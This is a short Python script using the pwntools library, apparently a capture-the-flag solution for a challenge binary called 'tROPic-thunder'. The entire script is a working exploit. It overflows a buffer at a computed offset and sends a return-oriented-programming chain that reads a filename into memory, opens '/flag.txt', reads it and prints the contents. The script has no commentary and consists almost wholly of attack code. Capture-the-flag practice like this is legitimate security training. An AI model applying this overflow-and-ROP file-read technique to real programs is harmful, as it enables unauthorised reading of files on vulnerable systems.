from pwn import *

elf = ELF("./tROPic-thunder")
#pwn.context.binary = elf
#pwn.context.log_level = "DEBUG"
libc = elf.libc
r = elf.process()


offset = cyclic_find("faab")

#Leak flag
rop = ROP(elf)
rop.read(0, elf.bss(), 0x100)
rop.open(elf.bss(), 0, 0)
rop.read(3, elf.bss(), 0x100)
rop.puts(elf.bss())

r.sendlineafter(b"one!", b"A" * offset + rop.chain())
r.send(b"/flag.txt")
print(r.recvall().strip())
r.interactive()